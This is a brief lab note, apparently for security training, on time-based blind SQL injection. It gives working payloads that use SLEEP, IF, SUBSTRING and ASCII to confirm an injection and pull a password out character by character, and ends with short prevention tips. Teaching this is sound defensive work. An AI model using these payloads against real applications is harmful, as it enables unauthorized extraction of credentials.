# 🧪 Lab: Blind SQL Injection - Time-Based Delay

## 🎯 Goal
Extract data using time delays

## 🔍 Vulnerability Type
Blind SQL Injection (Time-based)

---

## 🧠 Concept Overview

The application does not show:
- Output ❌  
- Errors ❌  
- Response differences ❌  

Instead, we rely on **time delays** to infer TRUE or FALSE.

---

## ⚙️ Step 1 — Confirm Injection

### Payload:
' AND SLEEP(5)--  

### Observation:
- Delay → injection works  

---

## ⚙️ Step 2 — Conditional Delay

### Payload:
' AND IF(1=1, SLEEP(5), 0)--  

👉 TRUE → delay  
👉 FALSE → no delay  

---

## ⚙️ Step 3 — Determine Length

### Payload:
' AND IF(LENGTH(password)>5, SLEEP(5), 0)--  

👉 Helps identify password length

---

## ⚙️ Step 4 — Extract Characters

### Payload:
' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)--  

👉 Delay = correct character  

---

## 🔁 Payload Variations

- ' AND IF(LENGTH(password)=8, SLEEP(5), 0)--  
- ' AND IF(ASCII(SUBSTRING(password,1,1))>100, SLEEP(5), 0)--  

---

## 🌍 Real-World Impact

- Works even with no visible output  
- Very stealthy  
- Used in hardened applications  

---

## 🛡️ Prevention

- Parameterized queries  
- Query time monitoring  
- Input validation  

---

## ⚠️ Key Insight

Time-based SQLi is:
- Very slow ❌  
- Requires many requests ❌  

But:
👉 Works when everything else fails
